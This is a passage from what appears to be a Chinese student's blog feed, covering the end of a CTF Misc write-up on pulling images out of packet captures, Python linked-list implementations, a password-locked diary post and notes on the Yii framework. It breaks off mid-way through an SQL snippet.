title="MISC"></a>MISC</h3><p>简单讲讲吧，我有点懒就不想多说了<br>两个题目流量分析题目的思路都是一致的先找到应用层的每一次会话，然后在响应里面找到对应的传送信息，两个题目都是图片。。<br><a href="https://imgchr.com/i/P9MNVK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MNVK.md.png" alt="P9MNVK.md.png"></a></p><p>这是其中一个包里面的图片，直接利用<code>html</code>的功能就好<br><img src="https://s1.ax1x.com/2018/06/23/P9Ma5D.png" alt="P9Ma5D.png"><br>得到flag</p><p>另外一个包直接选择分组字节流提取出来直接保存为图片就好,然后<code>notepad++</code>打开，最后一行就是flag<br><img src="https://s1.ax1x.com/2018/06/23/P9M6qP.png" alt="P9M6qP.png"></p><p>最后一题Misc好像是某一个比赛的原题。。。flag也没改，考了一波音频里面藏水印，加一次图片的伸缩，本人电脑没有<code>MATLAB</code>就不弄了</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>做完这题目下午做微机实验汇编懵得一批。。。。。。头晕</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构复习二 双向链表(python实现)</title>
      <link href="/2018/06/17/python-DataStruct-2/"/>
      <url>/2018/06/17/python-DataStruct-2/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，<br> <a id="more"></a>微机(实验写汇编对指令不熟)，计网(子网跟超网的题目还不熟练)，双向链表其实就是比单向链表的节点多了一个前驱结点的部分，虽然简单但是还是在编写时出现问题，出现问题就值得去记录</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>双向链表的实现，这个双向链表比昨天写的多了一点点而而已，头结点的前驱节点默认是<code>None</code>，而且在遍历，搜索以及判空等步骤都是与昨天的写法一样，可以直接尝试<code>import</code>一下昨天的文件，让今天的双向链表继承昨天的单向链表的相同操作<br>(python 3.5实现)</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line">        self.prev = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span> <span class="comment">#这里默认第一个节点的前驱指针指的是None</span></span><br><span class="line">        self.__head = node <span class="comment">#私有化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__head <span class="keyword">is</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem, end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next  <span class="comment">#这两句话顺序不能调换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##其实上面的都不用改</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line">        <span class="keyword">if</span> node.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            node.next.prev = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">               cur = cur.next</span><br><span class="line">            node.next = cur.next</span><br><span class="line">            node.prev = cur</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">             self.add(item)</span><br><span class="line">        <span class="keyword">elif</span> pos &gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            cur = self.__head</span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                cur = cur.next</span><br><span class="line">            node.next = cur</span><br><span class="line">            node.prev = cur.prev</span><br><span class="line">            cur.prev.next = node</span><br><span class="line">            cur.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                    <span class="comment"># 判断链表是否只有一个节点,不是的话就执行这一条件语句</span></span><br><span class="line">                    self.__head = <span class="keyword">None</span></span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        self.__head = cur.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur.prev.next = cur.next</span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        cur.next.prev = cur.prev</span><br><span class="line">                <span class="keyword">break</span>   <span class="comment">#注意下这里的break，不要忘了</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = DoubleLinkList()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3</span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里我记录一下我出现的几个问题<br>第一，各节点的链接操作一定要注意顺序，比如在遍历的时候进入循环后是先进行输出操作，再把指针移到下一位等等<br>第二，每一种操作都要注意考虑单个节点，是否为头结点，尾节点的问题，然后去给出一定的条件去控制，不然很容易出错，在写<code>remove操作</code>的时候我就在考虑完头结点之后就没有考虑是否为单个节点的情况，导致程序出错，<br>第三，注意<code>remove操作</code>的<code>break</code>，这一点我还是用<code>debugger功能</code>一直<code>F7 F8 F9</code>找出来的。。。就发现一直在那个函数里面不出来，一直循环才惊醒要加break，23333<br>早早睡觉，明天早起复习概率论!!!!!!</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程语言 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构复习一 单链表(python实现)</title>
      <link href="/2018/06/16/python-DataStruct-1/"/>
      <url>/2018/06/16/python-DataStruct-1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习一下数据结构，感觉生疏了，用python重新写一遍吧<br><a id="more"></a> </p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="单链表的实现"><a href="#单链表的实现" class="headerlink" title="单链表的实现"></a>单链表的实现</h3><p>这里由于python变量的特殊性，python变量相当于维护的是一个地址，不像其他语言的的变量一样要事先定义自身的类型，这就使得python实现单链表比较方便，自我感觉。。。。比如在C语言里面设定了int类型的变量，你只能够往里面存放整形数据，而且是直接对应的数据，但是python的变量类型直接是一个地址，就例如 <code>a = 20</code>, 其实这里的a存放的是20这个数的地址， 通过a就可以找到20这个数字了。。这也解释了为什么Python里面可以这样去把两个数调换，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="number">20</span> </span><br><span class="line">b = <span class="number">30</span> </span><br><span class="line">a, b = b , a</span><br></pre></td></tr></table></figure><p>下面是单链表实现代码(python 3.5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleLinklist</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span></span><br><span class="line">        self.__head = node  <span class="comment">#这里用了__来实现一定程度的私有化，因为用户一般不需要知道这个参数的存在</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span>  <span class="comment">#判断是否为空</span></span><br><span class="line">        <span class="keyword">return</span> (self.__head == <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span> <span class="comment">#获取长度</span></span><br><span class="line">        cur = self.__head <span class="comment">#设置游标，类似于C里面的指针</span></span><br><span class="line">        count = <span class="number">0</span> <span class="comment">#最好设置为0，不然的话下面的条件可能也看情况变化，个人感觉这样好理解</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span> <span class="comment">#遍历一遍链表，这个跟获取长度就差不多</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem,end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span> <span class="comment">#头插法</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span> <span class="comment">#尾插法</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item )</span>:</span> <span class="comment">#在某个位置插入数字</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">            self.add(item)  <span class="comment"># 位置小于0的时候默认头插法</span></span><br><span class="line">        <span class="keyword">elif</span> pos&gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item) <span class="comment"># 位置大于长度，默认尾插法，所以不能使用等于号会误插</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pre = self.__head</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos<span class="number">-1</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                pre = pre.next</span><br><span class="line">            node.next = pre.next</span><br><span class="line">            pre.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span> <span class="comment">#默认删除一个找到的节点</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        pre = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item: <span class="comment">#找到了的话</span></span><br><span class="line">                <span class="comment">#判断是否为头结点</span></span><br><span class="line">                  <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                      self.__head = cur.next</span><br><span class="line">                  <span class="keyword">else</span>:</span><br><span class="line">                      pre.next = cur.next</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span> <span class="comment"># 查找元素</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = SingleLinklist()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3 </span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总体感觉在写单链表的时候要注意几个问题，注意要多考虑一下几种典型的情况，比如空链表，只有一个节点的时候，或者是最后一个节点的情况等等。。。第二的话还是要注意一下变量的赋值，这东西很容易写着写着脑子就抽了，然后就会出现溢出的情况额。。。</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程语言 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>两年</title>
      <link href="/2018/06/08/writing-1/"/>
      <url>/2018/06/08/writing-1/</url>
      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>编写Yii框架项目时出现的问题</title>
      <link href="/2018/06/06/Yii-probleam/"/>
      <url>/2018/06/06/Yii-probleam/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下编写Yii框架中项目的问题，也可以说是边学习边记录，有点乱，但是自己看得懂就好</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web应用根目录下"><a href="#web应用根目录下" class="headerlink" title="web应用根目录下"></a>web应用根目录下</h3><p>   <code>asset</code>包含yii发布的各种资源文件包括js和css</p><p>多用公共模板文件去加载，不多过多去冗余，注意在<code>views</code>文件夹下创建跟<code>controller</code>一样名字的视图文件夹</p><p>注意在某些资源文件调进asset文件夹的时候需要修改路径，一般都是要搜索像<code>img script css</code>之类的关键字</p><h3 id="复习一下循环将所有内容输出的格式"><a href="#复习一下循环将所有内容输出的格式" class="headerlink" title="复习一下循环将所有内容输出的格式"></a>复习一下循环将所有内容输出的格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($a <span class="keyword">as</span> $b): <span class="meta">?&gt;</span></span><br><span class="line">&lt;td&gt; </span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $b;<span class="meta">?&gt;</span> </span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">     <span class="comment">//把各部分元素输出就好，这里不一定单单就是$b,也可能是$b-&gt;某个元素</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在新建modules时候我们需要<code>gii脚手架</code>的帮助，这个选项在<code>web.php</code>里面，一般默认开启，需要对他有权限就需要加上你的ip，添加一个<code>allowedIPs</code>选项，如下图<br><img src="https://s1.ax1x.com/2018/06/06/CHkkad.png" alt="CHkkad.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkAIA.png" alt="CHkAIA.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkVPI.png" alt="CHkVPI.png"></p><h3 id="新建的modules"><a href="#新建的modules" class="headerlink" title="新建的modules"></a>新建的modules</h3><p>这相当于一个小型的Yii框架我感觉。。。。里面也有一个小型的mvc<br>然后我们还需要在<code>web.php</code>加上相应的<code>modules</code>模块<br><img src="https://s1.ax1x.com/2018/06/06/CHkKsS.png" alt="CHkKsS.png"><br>他好像默认调用的布局文件好像是view里面的<code>layouts/main.php</code><br>自己调一下就好了</p><p>另外填写命名空间的时候还需要改一下<code>namespace app\modules\controllers;</code>相当于增加了<code>modules</code></p><p>Yii2下的文件一般都是框架重要的配置文件，我们可以在里面的<code>web/application</code> 找到<code>public defaultRoute</code>是指定默认的主页路径的，一般最后开发的时候会把原来的布局给删掉，所以这个参数一般要改，但是我们不会选择直接改，改了Yii框架源码最后检错的时候会有点艰难，而是在<code>web.php</code>这个配置文件中修改，直接添加对应的参数名字就好，如下图<br><img src="https://s1.ax1x.com/2018/06/06/CHkuM8.png" alt="CHkuM8.png"></p><h3 id="创建SQL文件"><a href="#创建SQL文件" class="headerlink" title="创建SQL文件"></a>创建SQL文件</h3><p>这里的comment后面的内容是说明，这里还学到一种使用数据库的新模式，UNIQUE约束，这个东西相当于设定一个对应的SET查询，我猜中间那里应该是<code>SQL约束</code>的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span><span 